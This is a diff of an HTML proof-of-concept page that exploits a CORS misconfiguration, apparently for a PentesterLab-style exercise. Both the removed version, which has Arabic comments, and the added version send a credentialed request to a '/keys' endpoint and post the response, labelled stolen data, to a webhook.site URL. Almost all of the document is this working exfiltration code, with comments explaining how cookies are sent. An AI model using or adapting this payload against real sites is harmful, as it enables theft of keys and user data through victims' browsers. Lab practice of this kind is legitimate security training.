@@ -1,56 +1,38 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>CORS PoC</title>
+    <title>CORS II Exploit</title>
 </head>
 <body>
+    <h1>Exploiting CORS Misconfiguration...</h1>
+    <script>
+        // 1. Define the target URL and your webhook
+        var targetUrl = "https://ptl-29f079a0b03c-66be1acf5fbb.libcurl.me/keys";
+        var webhookUrl = "https://webhook.site/2a326388-6705-466d-9454-bd91d189b738";
 
-<h3>Loading... please wait</h3>
+        // 2. Create the XHR request to the vulnerable site
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", targetUrl, true);
+        
+        // This is the most critical part: it tells the browser to send cookies
+        xhr.withCredentials = true;
 
-<script>
-    // الـ endpoint اللي فيه المفتاح
-    const targetUrl = "https://ptl-29f079a0b03c-66be1acf5fbb.libcurl.me/keys";
-
-    // webhook الخاص بك (غيّره لو عايز webhook جديد)
-    const webhook = "https://webhook.site/2a326388-6705-466d-9454-bd91d189b738";
-
-    var xhr = new XMLHttpRequest();
-    xhr.open("GET", targetUrl, true);
-    xhr.withCredentials = true;          // مهم جدًا: يبعت الكوكيز
-
-    xhr.onload = function () {
-        if (xhr.status === 200 || xhr.status === 403 || xhr.status === 401) {
-            var data = xhr.responseText;
-
-            // لو الرد JSON، نحوله لstring نظيف
-            try {
-                var jsonData = JSON.parse(data);
-                data = JSON.stringify(jsonData, null, 2);
-            } catch (e) {
-                // لو مش JSON، نستخدمه كما هو
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState == 4) {
+                // 3. Once we have the data, send it to the webhook
+                var stolenData = xhr.responseText;
+                
+                // We use another XHR or a simple GET request via an Image object to exfiltrate
+                var exfil = new XMLHttpRequest();
+                exfil.open("POST", webhookUrl, true);
+                exfil.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                exfil.send("data=" + encodeURIComponent(stolenData));
+                
+                console.log("Data sent to webhook: " + stolenData);
             }
+        };
 
-            // طريقة 1: إرسال عبر POST (أفضل وأنظف)
-            var leakXhr = new XMLHttpRequest();
-            leakXhr.open("POST", webhook, true);
-            leakXhr.send("stolen_data=" + encodeURIComponent(data));
-
-            // طريقة 2: إرسال عبر GET (لو POST ما اشتغلش)
-            // new Image().src = webhook + "?data=" + encodeURIComponent(data);
-
-            document.body.innerHTML += "<pre>تم إرسال البيانات إلى webhook\n\n" + data + "</pre>";
-        } else {
-            document.body.innerHTML += "<p>خطأ: " + xhr.status + " - " + xhr.statusText + "</p>";
-        }
-    };
-
-    xhr.onerror = function () {
-        document.body.innerHTML += "<p>فشل الاتصال بالهدف (ربما CORS أو شبكة)</p>";
-    };
-
-    xhr.send();
-</script>
-
+        xhr.send();
+    </script>
 </body>
 </html>
